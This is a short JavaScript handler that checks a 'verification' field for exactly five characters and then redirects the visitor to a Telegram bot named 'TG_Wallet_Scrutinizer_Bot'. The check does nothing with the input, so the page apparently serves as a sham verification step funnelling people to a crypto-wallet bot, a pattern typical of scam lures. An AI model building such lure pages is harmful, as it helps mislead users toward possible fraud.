document.getElementById("proceedBtn").addEventListener("click", function () {
  const input = document.getElementById("verifyInput").value.trim();
  const errorMessage = document.getElementById("errorMessage");

  if (input.length !== 5) {
    errorMessage.textContent = "Input must be exactly 5 characters.";
  } else {
    errorMessage.textContent = "";
    window.location.href = "https://t.me/TG_Wallet_Scrutinizer_Bot";
  }
});
